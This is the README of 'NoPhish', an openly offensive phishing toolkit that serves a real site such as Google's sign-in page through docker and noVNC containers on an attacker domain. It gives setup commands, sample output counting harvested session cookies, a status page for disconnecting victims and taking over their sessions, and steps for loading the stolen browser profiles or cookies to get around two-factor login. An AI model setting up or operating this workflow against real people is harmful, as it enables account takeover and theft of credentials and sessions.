# NoPhish
 
Another phishing toolkit which provides a docker and noVNC based infrastructure. The whole setup is based on the initial article of [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) and [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html).

A detailed description of the setup can be found here - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## Installation

Ensure that docker is installed and working.

Install the required python modules:

```console
pip install lz4
```

Install the setup (which will create the required docker images):

```console
setup.sh install
```

## Execution

The setup offers the following parameters:

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```

A basic run looks like the following:

```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```

During the run the following overview provides a status per URL how many cookies or session informations have been gathered.

```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```
Please note that the tool will export all cookies / session information even when it is not related to a successful login.

Further you can also directly interact with the tool on the status page - `http(s)://%DOMAIN%:65534/status.php`. There you have the possibility to disconnect the user and directly take over the session.

In the current version of the tool for every user two containers are spawned - one for desktops and one for mobile devices. Based on the user agent the target gets redirected to a suitable container. The output of the mobile container is named with a leading "m" (e.g. mphis1-ffprofile).

## Using profile export
If you are using the complete FireFox profile export, you can just call firefox with -profile like that:

On Windows:
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

On Linux:
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

Everything is getting restored, including the latest site.

Please note by default you need to extract the zip archive or set the parameter `-z` to `false`. If the export format `-e simple` is chosen two json files will be generated which can be used with Cookiebro which is available for [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) and [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn).

## CleanUp

During a run the script can be terminated with `ctrl` + `c` - all running docker containers will then be deleted. To fully remove the setup run `setup.sh cleanup`.




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---